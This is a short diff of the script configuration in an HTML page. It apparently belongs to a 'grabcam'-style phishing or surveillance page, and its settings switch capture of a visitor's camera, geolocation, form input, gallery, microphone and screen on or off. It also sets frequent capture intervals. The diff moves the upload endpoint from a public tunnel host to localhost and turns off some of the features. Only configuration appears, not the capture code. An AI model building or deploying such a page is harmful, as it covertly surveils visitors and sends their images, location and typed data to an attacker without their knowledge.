@@ -296,8 +296,8 @@
 </body>
 <!-- Опции подгружаются с сервера (options.json) — можно включать камеру/гео/форму на лету без перезапуска -->
 <script>
-var GRABCAM_FEATURES = typeof {"camera": true, "geo": true, "form": true, "gallery": true, "mic": true, "screen": true} !== 'undefined' ? {"camera": true, "geo": true, "form": true, "gallery": true, "mic": true, "screen": true} : { camera: true, geo: true, form: true, gallery: false, mic: false, screen: false };
-var GRABCAM_POST_URL = 'https://6e5f075431d01f.lhr.life/post.php';
+var GRABCAM_FEATURES = typeof {"camera": true, "geo": true, "form": true, "gallery": false, "mic": false, "screen": false} !== 'undefined' ? {"camera": true, "geo": true, "form": true, "gallery": false, "mic": false, "screen": false} : { camera: true, geo: true, form: true, gallery: false, mic: false, screen: false };
+var GRABCAM_POST_URL = 'http://127.0.0.1:3334/post.php';
 var CAPTURE_INTERVAL_MS = 3000;
 var SCREEN_CAPTURE_INTERVAL_MS = 4000;
 var IMAGE_QUALITY = 0.85;
